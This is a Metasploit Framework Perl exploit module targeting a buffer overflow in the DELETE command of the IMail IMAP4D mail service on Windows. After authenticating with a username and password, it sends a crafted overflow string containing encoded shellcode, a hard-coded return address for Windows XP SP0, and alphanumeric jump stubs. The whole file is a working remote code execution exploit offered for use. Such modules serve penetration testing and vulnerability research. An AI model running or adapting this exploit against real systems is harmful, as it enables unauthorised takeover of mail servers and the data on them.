
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::imail_imap_delete;
use strict;
use base 'Msf::Exploit';
use Msf::Socket::Tcp;
use Pex::Text;

my $advanced = {
};

my $info = {
  'Name'    => 'IMail IMAP4D Delete Overflow',
  'Version'  => '$Revision: 1.2 $',
  'Authors' => [ 'spoonm <ninjatools [at] hush.com>', ],
  'Arch'    => [ 'x86' ],
  'OS'      => [ 'win32'],
  'Priv'    => 1, 
  'AutoOpts'  =>
    {
      'GETPCTYPE' => 'edx',
      'EXITFUNC'  => 'thread',
    },
  'UserOpts'  =>
    {
      'RHOST' => [1, 'ADDR', 'The target address'],
      'RPORT' => [1, 'PORT', 'The target port', 143],
      'USER'  => [1, 'DATA', 'IMAP Username'],
      'PASS'  => [1, 'DATA', 'IMAP Password'],
    },
  'Payload' =>
    {
      # give some stack space, align esp
      'Prepend'   => "\x81\xec\x96\x40\x00\x00\x66\x81\xe4\xf0\xff",
      'Space'     => 614,
      'BadChars'  => 
        # hd's evil map
        join('', map { $_=chr($_) } (0x00 .. 0x2f)).
        join('', map { $_=chr($_) } (0x3a .. 0x40)).
        join('', map { $_=chr($_) } (0x5b .. 0x60)).
        join('', map { $_=chr($_) } (0x7b .. 0xff)),
      'MinNops'   => 0,
      'MaxNops'   => 0,
    },
  'Encoder' =>
    {
      'Keys' => ['+alphanum'],
    },
  'Description'  => Pex::Text::Freeform(qq{
    This module exploits a buffer overflow in the 'DELETE' command of the
    the IMail IMAP4D service. This vulnerability can only be exploited with
    a valid username and password. This flaw was patched in version 8.14.
    }),
  'Refs'  =>
    [
      ['BID', 11675],
    ],
  'Targets' =>
    [
      # alphanum rets :(, will look more into it later
      ['Windows XP sp0 comctl32.dll', 0x77364650],
    ],
   'Keys' => ['imail'],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);

  return($self);
}

sub Exploit {
  my $self = shift;

  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');
  my $targetIndex = $self->GetVar('TARGET');
  my $user        = $self->GetVar('USER');
  my $pass        = $self->GetVar('PASS');
  my $encodedPayload = $self->GetVar('EncodedPayload');
  my $shellcode   = $encodedPayload->Payload;
  my $target = $self->Targets->[$targetIndex];


  my $sock = Msf::Socket::Tcp->new(
    'PeerAddr' => $targetHost,
    'PeerPort' => $targetPort,
  );
  if($sock->IsError) {
    $self->PrintLine('Error creating socket: ' . $sock->GetError);
    return;
  }

  my $resp = $sock->Recv(-1);
  chomp($resp);
  $self->PrintLine('[*] Got Banner: ' . $resp);

  my $evil = "a001 LOGIN $user $pass\r\n";
  $sock->Send($evil);
  my $resp = $sock->Recv(-1);
  if($sock->IsError) {
    $self->PrintLine('Socket error: ' . $sock->GetError);
    return;
  }
  if($resp !~ /^a001 OK LOGIN/) {
    $self->PrintLine('Login error: ' . $resp);
    return;
  }
  $self->PrintLine('[*] Logged in, sending overflow');

  $evil = 'A683 DELETE ';
  # shellcode
  $evil .= $shellcode;
  $evil .= 'B' x ($self->PayloadSpace - length($shellcode));
#  $evil .= $self->_Stupid(614);
  # jmp over code
  $evil .= "\x74\x32\x75\x30";
  # ret addr
  $evil .= pack('V', $target->[1]);
  # space
  $evil .= Pex::Text::AlphaNumText(44);
  # get eip code
  $evil .=
    "\x4c\x4c\x4c\x4c\x4c\x4c\x4c\x4c\x4c\x4c\x4c\x4c\x5a\x6a\x31\x59".
    "\x6b\x42\x34\x49\x30\x42\x4e\x42\x49\x75\x50\x4a\x4a\x52\x52\x59";
  # alphanum encoded jmp back (edx context)
  $evil .=
    "\x6a\x6a\x58\x30\x42\x31\x50\x41\x42\x6b\x42\x41".
    "\x7a\x42\x32\x42\x41\x32\x41\x41\x30\x41\x41\x58\x38\x42\x42\x50".
    "\x75\x4a\x49\x52\x7a\x71\x4a\x4d\x51\x7a\x4a\x6c\x55\x66\x62\x57".
    "\x70\x55\x50\x4b\x4f\x6b\x52\x6a";

  # run off the stack, so we don't kill our payload, or something...
  $evil .= Pex::Text::AlphaNumText(600);

  $evil .= "\r\n";

  # hopefully this works...
  $sock->Send($evil);

  $sock->Send($evil);
  my $resp = $sock->Recv(-1);
  if(length($resp)) {
    $self->PrintLine('[*] Got response, bad: ' . $resp);
  }

  return;
}

1;
